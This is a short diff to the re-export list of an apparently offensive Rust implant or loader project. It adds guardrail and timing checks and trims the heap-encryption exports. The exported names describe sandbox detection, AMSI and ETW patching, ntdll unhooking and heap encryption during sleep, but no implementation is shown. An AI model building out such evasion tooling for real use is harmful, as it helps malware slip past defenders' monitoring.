@@ -17,15 +17,17 @@ pub mod patching;
 pub mod sleep;
 
 // ── detection ─────────────────────────────────────────────────────────
-pub use detection::{is_bad_parent, is_virtualized, run_decoy};
+pub use detection::{
+    guardrail_violation, hour_in_window, is_bad_parent, is_root_or_system,
+    is_virtualized, run_decoy, wildcard_match,
+};
 
 // ── patching ──────────────────────────────────────────────────────────
 pub use patching::{patch_amsi, patch_etw, unhook_ntdll};
 
 // ── heap ──────────────────────────────────────────────────────────────
 pub use heap::{
-    decrypt_heap, decrypt_heap_aes256gcm,
-    encrypt_heap, encrypt_heap_aes256gcm,
+    decrypt_heap_aes256gcm, encrypt_heap_aes256gcm,
     resume_threads, suspend_other_threads,
 };
 
